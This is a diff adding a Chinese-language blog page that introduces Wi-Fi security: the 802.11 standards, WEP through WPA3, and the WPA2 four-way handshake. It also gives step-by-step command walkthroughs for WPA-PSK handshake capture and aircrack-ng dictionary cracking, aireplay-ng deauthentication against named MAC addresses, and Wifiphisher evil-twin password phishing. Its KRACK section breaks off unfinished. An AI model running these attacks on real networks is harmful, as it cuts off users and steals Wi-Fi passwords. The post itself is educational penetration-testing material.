@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="浅析Wi-Fi安全">
+<meta property="og:url" content="http://mamor5409.github.io/posts/ae3c8023/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/9.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/10.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/11.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/12.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/13.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/14.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/15.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/16.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/17.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/18.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/19.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/ae3c8023/20.png">
+<meta property="article:published_time" content="2024-03-21T09:41:07.000Z">
+<meta property="article:modified_time" content="2024-03-21T10:02:36.041Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="WiFi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/ae3c8023/1.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/ae3c8023/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>浅析Wi-Fi安全 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/ae3c8023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          浅析Wi-Fi安全
+        </h1>
+
+        <div class="post-meta">
+
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-21 17:41:07 / 修改时间：18:02:36" itemprop="dateCreated datePublished" datetime="2024-03-21T17:41:07+08:00">2024-03-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WiFi/" itemprop="url" rel="index"><span itemprop="name">WiFi</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>前言</p>
+<h3 id="IEEE-802-11"><a href="#IEEE-802-11" class="headerlink" title="IEEE 802.11"></a>IEEE 802.11</h3><p>802.11 体系结构包括几类主要组件， AP(Access Point，无线接入点)、STA(Station，站)、IBSS、BSS、DS、ESS。</p>
+<p>802.11标准将所有数据包分为3种：数据、管理、控制</p>
+<ul>
+<li>数据帧：用于传输用户数据，如文件、视频或音频等。</li>
+<li>管理帧：用于管理和维护网络，执行诸如扫描、连接和身份验证等功能。</li>
+<li>控制帧：用于控制数据传输过程，包括管理数据传输速率和流动，以及处理碰撞等。</li>
+</ul>
+<h4 id="协议标准"><a href="#协议标准" class="headerlink" title="协议标准"></a>协议标准</h4><p>在802.11标准中有多种不同的规范，每种规范都提供不同的数据传输速率、频率范围和安全特性。802.11标准已成为最为广泛的WLAN技术，并得到了各种设备的广泛支持。</p>
+<ul>
+<li>Wi-Fi 1 = IEEE 802.11b：支持2.4GHz频段的无线局域网协议，最高速率为11 Mbps。</li>
+<li>Wi-Fi 2 = IEEE 802.11a：支持5GHz频段的无线局域网协议，最高速率为54 Mbps。</li>
+<li>Wi-Fi 3 = IEEE 802.11g：支持2.4GHz频段的无线局域网协议，最高速率为54 Mbps。</li>
+<li>Wi-Fi 4 = IEEE 802.11n：支持2.4GHz和5GHz频段的无线局域网协议，最高速率为600 Mbps。</li>
+<li>Wi-Fi 5 = IEEE 802.11ac：支持5GHz频段的无线局域网协议，最高速率可达1.3 Gbps。</li>
+<li>Wi-Fi 6 = IEEE 802.11ax：支持2.4GHz和5GHz频段的无线局域网协议，最高速率可达10 Gbps。</li>
+</ul>
+<p>2.4GHz与5GHz频段优缺点对比如下：</p>
+<p><img src="/posts/ae3c8023/1.png"></p>
+<p>在802.11b 802.11g 802.11n标准中，2.4GHz频段被划分为14个信道，1~13信道无需申请可以随意使用。</p>
+<p>每个信道的有效带宽为20MHz【实际带宽22MHz，其中2MHz为隔离频带】，相邻信道的中心频点间隔为5MHz，因此在多个信道之间会存在重叠的频率。</p>
+<p>干扰最小的新的有3组，可同下图看出（1、6、11  和  2、7、12 和 3、8、13）</p>
+<p>图自 《黑客大揭秘：近源渗透测试》</p>
+<p><img src="/posts/ae3c8023/2.png"></p>
+<h3 id="802-11-加密系统"><a href="#802-11-加密系统" class="headerlink" title="802.11 加密系统"></a>802.11 加密系统</h3><p>无线网络的安全协议通常包括 WEP、WPA、WPA2、WPA3，其中较为安全的是WPA2和WPA3。使用WPA2/WPA3加密可以确保数据传输的安全性，避免被攻击者窃取或篡改。同时在使用时，建议使用高强度密码以增加被破解的难度。</p>
+<h4 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h4><p>全称是 Wired Equivalent Privacy，有线等效保密。WEP的核心采用RC4加密，加密密钥长度有64位、128位和152位。</p>
+<p>其中有24bit的IV偏移向量，有效密钥长度为40位、104位、128位。IV位于每个802.11帧头部的字段，在加解密过程中使用。</p>
+<h4 id="WPA"><a href="#WPA" class="headerlink" title="WPA"></a>WPA</h4><p>全称是 WiFi Protected Access，WiFi访问保护，常用的无线网络认证机制之一。WPA有两种不同的模式：</p>
+<ul>
+<li>企业模式 WPA-EAP</li>
+<li>个人模式 WPA-PSK</li>
+</ul>
+<p>WPA使用256位密钥，相比于WEP标准中使用的64位和128位密钥，并且在WPA中使用动态密钥加密，破解起来要比WEP困难。在WPA中密码越复杂，安全性越高。</p>
+<p>TKIP算法 虽然比起WEP有巨大进步，但是其仍是基于相同的RC4加密算法进行的，也很容易存在相同的问题。</p>
+<h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h4><p>WPA2 使用AES加密算法取代了WPA中的RC4，也使用更强完整性校验算法CCMP。</p>
+<p>是WPA的高级版本，用两种更强大的加密和身份验证机制取代了RC4和TKIP（临时密钥完整性协议，Temporal Key Integrity Protocol）：AES（advanced encryption standard，高级加密标准） 和分别使用密码块链接消息身份验证代码协议 ( CCMP ) 的计数器模式。</p>
+<p>WAP2 对于家庭网络较为使用，但对于企业网络很脆弱。攻击者可以访问使用WPA2保护的网络，访问网络后他们可以访问密码。字典攻击是WPA2密码最容易受到攻击的部分，可以利用</p>
+<p>airomon-ng对密码进行破解攻击。</p>
+<h4 id="WPA3"><a href="#WPA3" class="headerlink" title="WPA3"></a>WPA3</h4><p>Wi-Fi Protected Access Version 3 Wi-Fi访问保护3代 2018年提出的新安全标准，采用AES-GCMP加密方式，缓解了WPA2中存在的技术缺陷，环境类KRACK攻击和deauth等无线攻击带来的影响，大大提高了配置、身份验证、加密上的安全性。</p>
+<p>WAP3有两种安全模式：</p>
+<ul>
+<li>WAP3个人模式：提供 128 位加密，使用 WPA-PSK/预共享密钥。</li>
+<li>WAP3企业模式：提供 192 位加密，使用 AAA/RADIUS 认证服务器。</li>
+</ul>
+<h3 id="802-11-连接过程"><a href="#802-11-连接过程" class="headerlink" title="802.11 连接过程"></a>802.11 连接过程</h3><p>接入点（AP）和无线客户端之间的连接包含3个过程：扫描、认证、关联。完成安全性校验后 AP向Station 发起四次握手。</p>
+<ul>
+<li><p>扫描（探测）：Station扫描所在区域存在的802.11网络</p>
+<p>Station主动发送Req包，AP收到Req帧后回复Rsp帧</p>
+</li>
+<li><p>认证：Station与AP进行认证</p>
+<p>AP确认 Station是不是802.11设备 确认彼此可以正常通讯</p>
+</li>
+<li><p>关联： Station与AP进行关联</p>
+<p>Station与AP关联以便获得网络的访问权，关联成功后Station会收到AP的响应，包含成功的状态码和关联标识符</p>
+</li>
+</ul>
+<h3 id="WPA-WPA2-四次握手"><a href="#WPA-WPA2-四次握手" class="headerlink" title="WPA/WPA2 四次握手"></a>WPA/WPA2 四次握手</h3><p>无线Wifi的四次握手就是 key exchange的过程。整个过程分为身份认证（authentication）、关联（association）和安全验证（security validation）。四次握手不是直接将密码发送到 AP，而是通过 EAPOL（Extensible authentication protocol over LAN）进行消息交换。下面将简单介绍下四次握手的流程。</p>
+<p><img src="/posts/ae3c8023/3.png"></p>
+<h4 id="Msg1"><a href="#Msg1" class="headerlink" title="Msg1"></a>Msg1</h4><ul>
+<li>AP</li>
+</ul>
+<p>AP生成一个随机数ANonce 广播发送给Station</p>
+<ul>
+<li>Sta</li>
+</ul>
+<p>Sta接收AP发送的随机数ANonce，计算生产PTK(Sta)</p>
+<p>提取PTK的前16字节KCK  计算出MIC(Sta)</p>
+<h4 id="Msg2"><a href="#Msg2" class="headerlink" title="Msg2"></a>Msg2</h4><ul>
+<li>Sta</li>
+</ul>
+<p>Sta发送SNonce和MIC(sta)给AP</p>
+<ul>
+<li>AP</li>
+</ul>
+<p>AP收到Snoce后计算生成PTK(AP)</p>
+<p>根据PTK的前16字节KCK 生成MIC(AP)</p>
+<p>通过比对MIC(AP)和MIC(Sta)校验来PTK(AP)和PTK(Sta)，如果一致则进行下一步握手</p>
+<h4 id="Msg3"><a href="#Msg3" class="headerlink" title="Msg3"></a>Msg3</h4><ul>
+<li>AP</li>
+</ul>
+<p>AP根据GMK、ANonce、AP Mac 生成 GTK，使用PTK中间16字节KCK加密GTK</p>
+<p>GTK = PRF(GMK + ANonce + Mac(AA))</p>
+<p>根据PTK(AP)前16字节 KCK 生成 MIC(AP)</p>
+<p>将加密后的GTK和MIC(AP)发送给Sta</p>
+<ul>
+<li>Sta</li>
+</ul>
+<p>验证MIC(AP)与MIC(Sta)</p>
+<p>将AP发送的加密后的GTK使用PTK中间16字节KEK进行解密</p>
+<h4 id="Msg4"><a href="#Msg4" class="headerlink" title="Msg4"></a>Msg4</h4><ul>
+<li>Sta</li>
+</ul>
+<p>发送最后一次EAPOL-KEY给AP 进行最终认证</p>
+<ul>
+<li>AP</li>
+</ul>
+<p>接收Sta发送的EAPOL-KEY进行认证，认证通过则代表握手成功。</p>
+<p>如果认证成功 双方将安装各种计算出来的GTK和PTK 完成四次握手。</p>
+<h3 id="常见攻击方式"><a href="#常见攻击方式" class="headerlink" title="常见攻击方式"></a>常见攻击方式</h3><h4 id="离线字典攻击"><a href="#离线字典攻击" class="headerlink" title="离线字典攻击"></a>离线字典攻击</h4><p>可通过aircrack-ng 对WPA-PSK 进行密码破解</p>
+<p>查看可用的无线网卡 <code>sudo airmon-ng</code></p>
+<p><img src="/posts/ae3c8023/4.png"></p>
+<p>指定无线网卡开启监听模式 <code>airmon-ng start wlan0</code></p>
+<p><img src="/posts/ae3c8023/5.png"></p>
+<p>查看网卡是否开启监控 <code>ifconfig </code></p>
+<p><img src="/posts/ae3c8023/6.png"></p>
+<p>扫描附近的无线网络 <code>sudo airodump-ng wlan0mon</code> </p>
+<p><img src="/posts/ae3c8023/7.png"></p>
+<blockquote>
+<p>BSSID ：无线AP的硬件地址</p>
+<p>PWR：信号强度，绝对值越小信号越强。值为负数</p>
+<p>CH：无线网络信道</p>
+<p>ENC：加密方式</p>
+<p>ESSID：无线网络名</p>
+</blockquote>
+<p>使用参数过滤扫描列表，确定扫描目标</p>
+<blockquote>
+<p>使用命令：airodump-ng -w &lt;扫描结果保存的文件名&gt; -c &lt;无线网络信道&gt; –bssid &lt;目标无线 AP 的硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -w output -c 11 --bssid E2:D7:74:C2:F9:44  wlan0mon </span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/ae3c8023/8.png"></p>
+<p>使用aireplay-ng 对目标wifi发起攻击</p>
+<blockquote>
+<p>使用命令：aireplay-ng -&lt;攻击模式&gt; &lt;攻击次数&gt; -a &lt;无线AP硬件地址&gt; -c &lt;用户设备硬件地址&gt; &lt;处于监听模式的网卡名称&gt;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aireplay-ng -0 2 -a E2:D7:74:C2:F9:44 -c 56:D1:E9:EB:EA:2F  wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/ae3c8023/9.png"></p>
+<p>发起攻击后，当airodump-ng 成功监听到了握手包，退出抓包后可以进行爆破。在桌面下生成了output-01.cap</p>
+<p><img src="/posts/ae3c8023/10.png"></p>
+<p>使用aircrack-ng 暴力破解wifi密码</p>
+<blockquote>
+<p>aircrack-ng -w 密码字典 &lt;包含握手包的 cap 文件&gt;</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aircrack-ng -w pass.txt output-01.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/ae3c8023/11.png"></p>
+<p>这里的密码还需要跟着实际情况去构造，成不成功主要取决于密码字典的强度。</p>
+<h4 id="DeAuth-Attack"><a href="#DeAuth-Attack" class="headerlink" title="DeAuth Attack"></a>DeAuth Attack</h4><p>Wifi中断攻击，攻击原理： Wi-Fi关联数据帧没有被加密，导致攻击者可以伪造管理帧，从而让攻击者可以发送人员 取消认证的数据包强行切断AP与客户端之间的连接。</p>
+<p>1.查看可用的无线网卡 <code>sudo airmon-ng</code></p>
+<p><img src="/posts/ae3c8023/12.png"></p>
+<p>2.指定无线网卡开启监听模式 <code>airmon-ng start wlan0</code></p>
+<p><img src="/posts/ae3c8023/13.png"></p>
+<p>3.airodump-ng wlan0 对当前环境无线网络进行嗅探 根据ESSIS获取攻击目标MAC</p>
+<p>扫描附近的无线网络 <code>sudo airodump-ng wlan0mon</code> </p>
+<p><img src="/posts/ae3c8023/14.png"></p>
+<p>找到测试目标wifi Se及连接手机的MAC地址</p>
+<p>WIFI MAC 26:04:1C:39:46:7F</p>
+<p>Station MAC  A2:B4:63:18:D6:C2</p>
+<p>4.利用 airreplay-ng 进行 DeAuth 攻击</p>
+<p>sudo aireplay-ng -0 100 -a 26:04:1C:39:46:7F -c A2:B4:63:18:D6:C2 -D wlan0mon</p>
+<p>-0 选择DeAuth攻击模式</p>
+<p>-a AP的MAC地址</p>
+<p>-c 指定目标机器的mac地址</p>
+<p>-D 如果不加的话会报错No such BSSID available.</p>
+<p><img src="/posts/ae3c8023/15.png"></p>
+<p>攻击成功后 连接目标网络的机器都会被断开连接。</p>
+<p><img src="/posts/ae3c8023/16.png"></p>
+<h4 id="Wi-Fi-钓鱼"><a href="#Wi-Fi-钓鱼" class="headerlink" title="Wi-Fi 钓鱼"></a>Wi-Fi 钓鱼</h4><p>Wifiphisher</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a></p>
+<p>工作原理：</p>
+<ul>
+<li>嗅探附件无线区域内的AP，并创建一个伪造的AP</li>
+<li>Wifiphisher对目标AP连接的所有客户端持续发送大量的解除认证的数据包</li>
+<li>向被攻击者推送一个钓鱼页面，要求被攻击者输入密码</li>
+</ul>
+<p>实例如下：</p>
+<p>sudo wifiphisher</p>
+<p>然后会探测到周边的网络信号源，然后选择需要攻击的wifi（这里以手机热点MI11为例）</p>
+<p><img src="/posts/ae3c8023/17.png"></p>
+<p><img src="/posts/ae3c8023/18.png"></p>
+<p>接着选择攻击模式，第一项“网络管理器连接“：模拟wifi失败然后需要重新输入密码。</p>
+<p><img src="/posts/ae3c8023/19.png"></p>
+<p>回车之后会自动跳转到以下</p>
+<p><img src="/posts/ae3c8023/20.png"></p>
+<p>wifiphisher会发射一个与原wifi相同名称的wifi，如果用户想要重新连接该wifi，会弹出一个重新输入密码的页面。</p>
+<p>![](/Users/mamor/Library/Application Support/typora-user-images/image-20240321175728864.png)</p>
+<p>如果点击取消会如下如所示，还是伪装的比较真实的。</p>
+<p>![image-20240321175747230](/Users/mamor/Library/Application Support/typora-user-images/image-20240321175747230.png)</p>
+<p>当用户输入密码时 我们便通过这种wifi调用的方式得到了wifi密码</p>
+<p>![image-20240321175800062](/Users/mamor/Library/Application Support/typora-user-images/image-20240321175800062.png)</p>
+<hr>
+<h4 id="密钥重装攻击"><a href="#密钥重装攻击" class="headerlink" title="密钥重装攻击"></a>密钥重装攻击</h4><p>密钥重装攻击（key reinstallation attacks，简称：KRACKs），是对用于保护Wi-Fi连接的Protected Access Protocol（WPA2）的重放攻击。</p>
+<p>在四次握手过程中的第三次握手中，AP会发送Msg3(GTK+MIC) 给Station，如果Station没有收到AP发送的消息，AP会重传Msg3；但是Station不会根据是否收到AP发送消息进行判断，会直接发出ACK，完成第四次握手。由于已经安装了PTK，所以Station回复的Msg4是一个加密后的Msg4。</p>
+<p>攻击者可以通过</p>
+<p>在数学证明上 已经证明了四次握手的安全性，四次握手保证了密钥协商是安全的、握手信息是无法篡改的。但是实际上可以多次安装相同的密钥，从而重置加密协议使用的随机数和重播计数器。</p>
+<p>实例</p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>《黑客大揭秘：近源渗透测试》</p>
+<p><a target="_blank" rel="noopener" href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kanxue.com/book-47-748.htm">https://www.kanxue.com/book-47-748.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1819">https://forum.butian.net/share/1819</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.wevul.com/1647.html">https://www.wevul.com/1647.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/30229178">https://zhuanlan.zhihu.com/p/30229178</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Matsec/p/15429176.html">https://www.cnblogs.com/Matsec/p/15429176.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/WiFi/" rel="tag"></i><i class="fa fa-tag"></i> WiFi</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/40c61146/" rel="prev" title="密码学之流密码">
+      <i class="fa fa-chevron-left"></i> 密码学之流密码
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#IEEE-802-11"><span class="nav-number">1.</span> <span class="nav-text">IEEE 802.11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%8F%E8%AE%AE%E6%A0%87%E5%87%86"><span class="nav-number">1.1.</span> <span class="nav-text">协议标准</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#802-11-%E5%8A%A0%E5%AF%86%E7%B3%BB%E7%BB%9F"><span class="nav-number">2.</span> <span class="nav-text">802.11 加密系统</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEP"><span class="nav-number">2.1.</span> <span class="nav-text">WEP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA"><span class="nav-number">2.2.</span> <span class="nav-text">WPA</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WPA2"><span class="nav-number">2.3.</span> <span 